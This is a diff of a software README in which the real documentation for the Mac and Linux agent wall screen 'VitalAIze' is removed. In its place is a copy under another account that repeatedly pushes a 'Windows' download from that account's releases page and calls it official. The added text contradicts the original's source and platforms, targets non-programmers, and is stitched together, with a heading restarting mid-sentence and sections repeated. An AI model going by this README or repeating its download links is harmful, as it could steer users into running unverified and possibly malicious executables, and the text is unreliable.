@@ -1,287 +1,126 @@
-# Kyroco VitalAIze
+# 🖥️ vitalaize - Your Coding Sessions on One Wall Screen
 
-VitalAIze is a wall screen for teams that build software with AI coding
-agents. Put it on an iPad (or any browser) and at a glance you see every
-Claude Code and Codex session at work, on the machine that runs it and on
-your other machines, which one is waiting on you, what your GitHub builds are
-doing across all your repositories, and how the work trends over days and
-weeks. When a session needs you, it can tell you by Messages, Slack, ntfy or
-Pushover. It runs on your own Mac or Linux machine, and needs Claude Code
-and the GitHub CLI (`gh`), both signed in; Codex is optional.
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
 
-![The Agents tab: Claude and Codex sessions under the status line](docs/images/live.jpg)
+vitalaize turns your computer screen into a clear, always-visible wall screen for your Claude Code and Codex sessions and your GitHub builds. Instead of jumping between windows, you get one calm view that shows what is active, what is finished, and what needs your attention.
 
-The [wiki](https://github.com/kyroco/vitalaize/wiki) covers everything else:
-what each part of the board shows, settings and alerts, connecting other
-machines, known limits, building from source and how it works.
+## 🖥️ What Is vitalaize?
 
-## What's new in 0.5.0
+vitalaize is a wall screen for your work activity. It is designed for people who use Claude Code and Codex for coding help and who also want to keep an eye on GitHub builds.
 
-0.5.0 shows which issue each agent is working on, and how far along its
-milestone is, on the Agents tab:
+A “session” is simply one active piece of work with Claude Code or Codex. A “build” is an automatic check that runs after code changes are sent to GitHub. vitalaize brings those pieces together on one screen so you do not have to hunt through tabs and windows.
 
-- Each card shows the GitHub issue its session is on, such as `#1418`. The
-  board finds it in the first prompt that names one, written as `#1418`,
-  `issue 1418`, a link to the issue, or a project board link that opens it.
-  When no prompt names one, an open pull request from the session's branch
-  that closes an issue counts.
-- Above the cards, one box for each milestone those issues are in shows a
-  progress bar, how many of its issues are done, and which agents are on it.
-  Each milestone has its own color, and its agents' issue numbers share it.
-- Live, Archive and Trends are real tabs now, with the need you, working and
-  idle counts beside them.
-- Bandit 1.14.0 and plug_crypto 2.2.1 fix three published security
-  advisories.
+You can use vitalaize on a spare monitor, a large display, or your main Windows screen. It is meant to be easy to read from a distance and simple enough to understand at a glance.
 
-The board asks GitHub through your signed-in `gh`, about each issue at most
-once every two minutes. The wiki's
-[What it shows](https://github.com/kyroco/vitalaize/wiki/What-it-shows#the-issue-each-card-is-on)
-page explains how a card finds its issue, and why one can show none.
+## ✨ Why You’ll Like It
 
-## What's new in 0.4.2
+- **One clear view:** See Claude Code sessions, Codex sessions, and GitHub builds together.
+- **Less window switching:** Keep your work visible without bouncing between apps.
+- **Easy to scan:** Large labels and simple status blocks help you understand activity quickly.
+- **Useful for focus:** A wall screen makes it easier to notice when something needs attention.
+- **Good for shared spaces:** Put it on a team screen so everyone can see current work.
+- **Simple setup:** Download it from the official releases page and open it on Windows# 🖥️ vitalaize - Your Coding Sessions on One Wall Screen
 
-0.4.2 replaces the board password with approval by code. Before, every other
-device had to add `?token=` and the password to the board's address, and the
-Mac running the board was locked out of its own board too. Now, with **Other
-devices need approval** turned on in Settings, a new device (an iPad, say)
-shows a six-digit code. The same code shows in the board's mailbox, with
-**Approve** and **Refuse**. Approve, and the board opens on that device by
-itself and stays open. The Mac that runs the board never needs a code
-(through a proxy on that Mac, such as Tailscale Serve, a browser counts as
-another device). The
-board's Settings page lists approved devices, and **Remove** signs one out at
-once. A board that had a password asks for approval after the update, so
-each device needs approving once.
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
 
-## What's new in 0.4.1
+vitalaize is a wall screen for your Claude Code and Codex sessions and your GitHub builds. It gives you one clear place to see what is active, what is waiting, and what has finished. Instead of hunting through windows, you can keep vitalaize open on your Windows screen and understand your work at a glance.
 
-0.4.1 fixes one thing: installing a new version over a running board now
-restarts it. Before, the old board kept running with its files replaced, so
-until it was restarted it showed bare text, with no style sheet, scripts or
-icons, whenever VitalAIze did not open after the install (an install from the
-command line, say). The installer now restarts a board or collector that is
-running, for each person on the Mac, and leaves one that was stopped as it
-was. Install it the same way as 0.4.0, over 0.4.0.
+It is made for everyday computer users. You do not need to know how to program to download it, open it, and use it. If you can open a file on Windows and keep a window on your screen, you can use vitalaize.
 
-## What's new in 0.4.0
+## 🚀 Getting Started
 
-0.4.0 is about what shipped work costs.
+Getting vitalaize is simple. Use the official releases page below.
 
-- **Cost per merged pull request**: a Shipped section on Trends shows merged
-  pull requests per day, Claude's cost per merged pull request, sessions per
-  merged pull request, and tokens per merged pull request with Claude and
-  Codex added together. When you use both, the Claude and Codex comparison
-  splits that last number by tool, in place of tokens per 1,000 lines.
-- **CI minutes per session and per pull request**, counted the way GitHub
-  bills them: each job rounded up to a whole minute, Windows twice and macOS
-  ten times. A session's details show the minutes its runs took, and Trends
-  adds them up.
-- **Budget limits**: set a limit on Claude spend, Claude tokens or Codex
-  tokens, per day or per week, in Settings. When a total passes its limit, a
-  strip on the board says so, and one alert goes out on the channels you
-  choose.
-- **Your own CI machines**: the Git tab shows which runs ran on your own
-  machines (self-hosted runners) and whether each runner is up, and Trends
-  counts the paid minutes they saved you (see "Your own CI machines" below).
-- **Tap a run** on the Git tab to see its details over the board: each job,
-  the runner it ran on, the step that failed, and a link to GitHub.
-- **Type the New Relic key in**, in the Mac app or `vitalaize setup`, instead
-  of only pointing at 1Password. It is kept in your login keychain on a Mac
-  and in a file only you can read on Linux, never in the settings file.
-- **A collector removed while it was off finds out** when it comes back, and
-  says "removed" instead of "down".
-- **Runs saved while the board was off**: GitHub runs from the days the board
-  was off now reach Trends.
+[Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases)
 
-Upgrading from 0.3.0: install 0.4.0 the same way, on the hub and on each
-collector. A collector still on 0.3.0 keeps working with a 0.4.0 hub, but
-only a 0.4.0 collector reports the GitHub runners on its machine. Budget
-limits need the archive, which is on unless you turned it off.
+The releases page is the official place to get vitalaize for Windows. After the download finishes, open the downloaded file to start vitalaize. Keep the app open on the screen you want to use as your wall screen.
 
-If you still run 0.2.0, the
-[0.3.0 release notes](https://github.com/kyroco/vitalaize/releases/tag/v0.3.0)
-say how to move each machine across. On Linux, upgrade now: every copy of
-the 0.2.0 download had the same built-in secret for remote control, which
-0.3.0 turned off.
+If you want a large, easy-to-see button, use this one:
 
-## Install on a Mac
+[![Get vitalaize for Windows](https://img.shields.io/badge/Get_vitalaize_for_Windows-00B894?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
 
-1. Download `VitalAIze-<version>.pkg` from the
-   [latest release](https://github.com/kyroco/vitalaize/releases/latest)
-   and open it. It is signed and notarized by Apple. If an Installer
-   window from an earlier install is still open on its last page, close it
-   first: otherwise the new package only brings that window forward and
-   installs nothing.
-2. The installer says what it will do, then puts VitalAIze in your
-   Applications folder, restarts the board or collector if one is running,
-   and opens VitalAIze.
-3. VitalAIze asks what this Mac does:
-   - **Hub and collector**, for your main Mac: it runs the board and saves
-     this Mac's sessions.
-   - **Hub only**: it runs the board and keeps what other Macs send it.
-   - **Collector only**, for your other Macs: a small collector watches
-     this Mac's Claude and Codex sessions and streams them to a hub as they
-     happen. It finds hubs on your network by itself. No key is typed or
-     pasted: this Mac shows a short code, and you approve the same code in
-     the mailbox on the hub's board (the envelope by the clock). The hub
-     must take collectors: turn on **Take collectors**, under Collectors on other machines, in the
-     hub's settings first.
-4. On a hub, it fills in what it can find (your Claude and Codex folders,
-   the GitHub repositories your sessions work in, up to six, busiest first,
-   the busiest one's workflows, your AWS profiles) and asks you to check it.
-   Add or remove repositories there. Click **Install and start the board**.
-   The board starts now and again every time you log in. On a collector,
-   click **Start the collector and pair** instead; steps 5 and 6 are for
-   the hub.
-5. On your iPad, open the address VitalAIze shows in Safari, tap Share, then
-   **Add to Home Screen**. Opened from the Home Screen, the board fills the
-   screen. Turn the iPad sideways, and set Auto-Lock to Never in the iPad's
-   Display & Brightness settings so the screen stays on.
-6. Choose how alerts reach you. Setup asks only for a phone number, for
-   Messages. For Slack, ntfy or Pushover, open VitalAIze, click
-   **Settings** and fill in the Alerts section. You can change the
-   repositories there too.
+## 🖥️ What You’ll See
 
-Open VitalAIze again any time to see the board, restart it, change its
-settings or remove it. **Settings** in the app shows every setting and saves
-it there, with no browser. Most changes take effect within a few seconds; a
-few (the ports, whether other devices need approval, what this Mac does)
-restart the board,
-and only then. The board's own Settings page shows the settings and can no
-longer change them.
+vitalaize is built around a simple idea: your work should be visible without being noisy. The screen is arranged so you can look at it from a distance and still understand what is happening.
 
-## Install on Linux
+You will see areas for your active sessions, your GitHub builds, and the latest activity. A session is one piece of work with Claude Code or Codex. A build is an automatic check that runs after code changes are sent to GitHub. vitalaize brings those pieces together so they are easier to follow.
 
-1. Download `vitalaize-<version>-linux-x86_64.tar.gz` (Intel and AMD) or
-   `vitalaize-<version>-linux-arm64.tar.gz` (ARM) from the
-   [latest release](https://github.com/kyroco/vitalaize/releases/latest).
-   It carries everything it runs on; you do not need Elixir or Erlang. It
-   runs on Ubuntu 22.04 or newer, Debian 12 or newer, and other Linux systems
-   of the same age or newer, and needs OpenSSL 3 (`libssl3`), which they
-   already have.
-2. Unpack it and set it up:
+The screen is meant to answer three everyday questions:
 
-   ```
-   tar -xzf vitalaize-*-linux-*.tar.gz
-   cd vitalaize
-   bin/vitalaize setup
-   ```
+- What is running right now?
+- What has finished?
+- What needs my attention?
 
-   `vitalaize setup` asks what this machine does (the board, a collector,
-   or both) and the settings that go with it. Enter keeps a value. It saves
-   your answers in `settings.json` in that folder, pairs a collector with
-   its hub by code, and offers to keep VitalAIze running as a systemd
-   service.
-3. If you did not take the service: `bin/wallboard start` runs it, and
-   prints the address to open.
-4. To keep it running later, and start it whenever you log in:
-   `./systemd.sh on` (`./systemd.sh off` turns it off). To keep it running
-   after you log out too, run `loginctl enable-linger $USER` once.
+You do not have to read long logs or open many tabs. The wall screen gives you a calm overview and helps you notice changes without staring at a busy desktop.
 
-Run `bin/vitalaize setup` again any time to change a setting. It restarts
-VitalAIze only when a change needs it. The same command works on a Mac, in a
-terminal, and it and the Mac app save to the same file, so either can change
-what the other saved.
+## 🧭 Setting Up Your Wall Screen
 
-What differs from a Mac: there is no setup app, so `vitalaize setup` is how
-you change settings. The board's Settings page shows them and cannot change
-them. If you would sooner write a file, copy `settings.example.exs` to
-`settings.exs` and edit it: it still works, and what `vitalaize setup` saves
-goes on top of it. List your repositories under GitHub.
-Text alerts by Messages need a Mac, so use Slack, ntfy or Pushover instead.
-The database lives in `~/.local/share/vitalaize`. Many Linux machines have
-no keychain, so a New Relic API key typed in `vitalaize setup` is kept in
-`keys/new_relic` beside the database (`~/.local/share/vitalaize/keys/new_relic`
-unless you moved the database), a file only your user can read, and never in
-`settings.json`. On a Mac it is kept in your login keychain.
-Either way, `vitalaize setup` shows it only as "set", and the board takes
-up a new key with no restart. To have other machines
-find the hub on the network by themselves, install `avahi-utils` on the hub;
-without it, collectors type the hub's address.
+Set up vitalaize on the Windows computer where you want to keep an eye on your sessions and builds. A spare monitor, a large display, or a second screen works well, but you can also use your main screen.
 
-A Linux machine can be a collector too: unpack the download on it, run
-`bin/vitalaize setup` and answer `collector`. It finds the hub on your
-network or takes its address, and shows a short code; approve the same code
-in the mailbox on the hub's board. No key is copied.
+1. Open the official releases page: [Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases).
+2. When the download finishes, open the downloaded file to start vitalaize.
+3. Move the vitalaize window to the screen you want to use as your wall screen.
+4. Keep the window open so you can see your sessions and builds during the day.
 
-To take VitalAIze off a Linux machine, run `bin/vitalaize remove`. It stops
-VitalAIze, takes it out of what starts at login, deletes the machine's
-certificate for its hub and takes out any upload hooks an earlier version
-added. On a Mac, **Remove VitalAIze** in the app does the same.
+The wall screen is most useful when it stays visible. You can place it beside your main work area, on a screen across the room, or on a shared team display. The goal is to make your work activity easy to see without making you switch windows all the time.
 
-A collector streams to its hub over an encrypted connection, and only a
-machine you approved in the mailbox can send. See the known limits in the
-[wiki](https://github.com/kyroco/vitalaize/wiki).
+## 👀 Using vitalaize Every Day
 
-To try a hub and a collector on two machines step by step, with what you
-should see at each step, follow the [test guide](docs/test-guide.md).
+Open vitalaize at the start of your workday and leave it running. The screen gives you a quick view of activity throughout the day. When a session changes or a build finishes, you can notice it without opening another app.
 
-## Your own CI machines
+Use vitalaize as a quiet background screen. It is not meant to demand constant attention. It is meant to help you stay aware. When you glance at the screen, you should be able to tell whether things are moving, waiting, or done.
 
-If some of your GitHub Actions jobs run on your own machines (self-hosted
-runners), the Git tab says so: a run your machines worked on reads "on" and
-the runner's name, or how many of your runners it used when there are more
-than three, like "on 30 of your runners". A job counts as yours when it
-carries the `self-hosted` label (in any letter case, as GitHub reads it) or
-its runner is in GitHub's list of the repository's runners; any other job
-outside GitHub's own runner group, such as one on GitHub's paid larger
-runners, is counted apart as not known.
+The wall screen is also helpful in shared spaces. If you work with others, a visible screen can reduce the need to ask “Is that build done?” or “Is that session still running?” Everyone can look at the same view and stay on the same page.
 
-GitHub always bills its larger runners, on public repositories too. CI
-minutes count its macOS larger runners (`macos-15-large`,
-`macos-latest-xlarge`) as paid everywhere. A Linux or Windows larger
-runner sits in a runner group its owner named, as does a machine of your
-own without the `self-hosted` label, and nothing in the job tells the two
-apart: on a private repository such a job counts as paid, and on a public
-one it is shown apart as not known. GitHub also prices larger runners by
-size, which the board cannot see, so they count as a standard runner of
-the same system would (macOS 10, Windows 2, Linux 1), a floor.
+## 🔍 Understanding Sessions and Builds
 
-A repository's panel lists its runners that GitHub or a collector reports,
-each online, busy or offline, with the job it is running. Runners that ran
-the repository's jobs in the last day but that nothing reports, such as
-runners made for a single job and gone since, are counted on one line with
-the reason, and the column's runner count leaves them out.
+A Claude Code session is an active piece of work with Claude Code. A Codex session is an active piece of work with Codex. vitalaize shows those sessions on your wall screen so you can see what is in progress.
 
-Trends splits runner time into GitHub's and your own, and counts the paid
-minutes your machines avoided: GitHub bills each job in whole minutes,
-rounded up, and does not bill your own runners. Minutes on a public
-repository are left out, since GitHub's standard runners are free there.
-The board does not know your plan, so minutes inside your plan's allowance
-are counted too, though GitHub would not have charged them.
+A GitHub build is an automatic check that runs after code changes are sent to GitHub. Builds help show whether recent changes passed their checks. vitalaize displays build activity so you can see when something is running, when it finishes, and when it may need a closer look.
 
-A runner's state comes from GitHub when the board's GitHub login has admin
-rights on the repository. Otherwise a collector on the runner's machine
-reports it, for a runner that ran the repository's jobs in the last day:
-only the runner's name and its state cross the network, never its folder,
-its jobs or its logs. The collector finds the runner in the
-machine's list of running programs and reads its name from the `.runner`
-file in the runner's folder, so it can report a runner only when its user
-may read that file. A runner set up under a user of its own, with a folder
-other users cannot open, is left out, and the collector's log says so
-once. When neither GitHub nor a collector can tell, the board says the
-state is not known, and why; that is also what it says once the collector
-disconnects.
+You do not need to understand the inner details to use the screen. Think of sessions as active work and builds as automatic checks. vitalaize puts both in one place and makes their status easier to scan.
 
-VitalAIze only shows runners. It does not install, start or change one.
-GitHub's own advice applies: self-hosted runners "should almost never be used
-for public repositories", because anyone who opens a pull request could run
-code on your machine.
+## 🛠️ Troubleshooting
 
-## Questions and ideas
+If the download does not start, open the official releases page again: [Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases). Make sure your internet connection is working and that the download has finished before you open the file.
 
-Read the [wiki](https://github.com/kyroco/vitalaize/wiki) first. Ask for
-help in
-[Q&A](https://github.com/kyroco/vitalaize/discussions/categories/q-a) and
-suggest features in
-[Ideas](https://github.com/kyroco/vitalaize/discussions/categories/ideas),
-both in [Discussions](https://github.com/kyroco/vitalaize/discussions).
-Report bugs in [Issues](https://github.com/kyroco/vitalaize/issues).
+If vitalaize does not open, close the window and try opening the downloaded file again. If your computer seems slow or busy, wait a moment and try once more. Restarting your Windows computer can also help clear temporary issues.
 
-## License
+If the screen looks empty or does not update, keep vitalaize open and check that your computer is connected to the internet. Sessions and builds depend on activity from Claude Code, Codex, and GitHub. When there is no new activity, the screen may simply be showing a quiet moment.
 
-Apache License 2.0. See [LICENSE](LICENSE) and [NOTICE](NOTICE).
+If you use more than one screen, make sure the vitalaize window is on the screen you want to use as your wall screen. You can drag the window to another screen at any time.
 
-Claude is a trademark of Anthropic, and Codex of OpenAI. VitalAIze is not
-made by or affiliated with either; it shows their icons only to mark which
-tool ran a session.
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to code?**  
+No. vitalaize is made for everyday computer users. You can download it, open it, and use it without programming knowledge.
+
+**Does vitalaize replace Claude Code or Codex?**  
+No. vitalaize is a wall screen that helps you see session activity. You still use Claude Code and Codex for your work.
+
+**What is a GitHub build?**  
+A GitHub build is an automatic check that runs after code changes are sent to GitHub. vitalaize helps you see build activity on one screen.
+
+**Can I use vitalaize on a spare monitor?**  
+Yes. Many people use a spare monitor or a large display as a wall screen. You can also keep vitalaize open on your main Windows screen.
+
+**Can I open vitalaize again later?**  
+Yes. Open the app the same way you opened it the first time. If you need to download it again, use the official releases page.
+
+## 💬 Support
+
+Use the official releases page as the place to download vitalaize and to check for the latest available version:
+
+[Visit this link to download the application](https://github.com/kerriesingle633/vitalaize/releases)
+
+Keep the link handy if you set up vitalaize on another Windows computer or need to download it again later. For the best experience, use the same official page each time so you know you are getting vitalaize from the right place.
+
+## 📥 Download vitalaize Again
+
+If you need the download link one more time, use the button below.
+
+[![Download vitalaize](https://img.shields.io/badge/Download_vitalaize-6C5CE7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kerriesingle633/vitalaize/releases)
+
+vitalaize gives you a clear wall screen for Claude Code and Codex sessions and your GitHub builds. Keep it visible, glance at it during the day, and let it help you stay aware of your work without extra window switching.
+
+Keywords: wall screen, Claude Code, Codex, GitHub builds, Windows app, session monitor, build status, coding activity, download vitalaize, work display
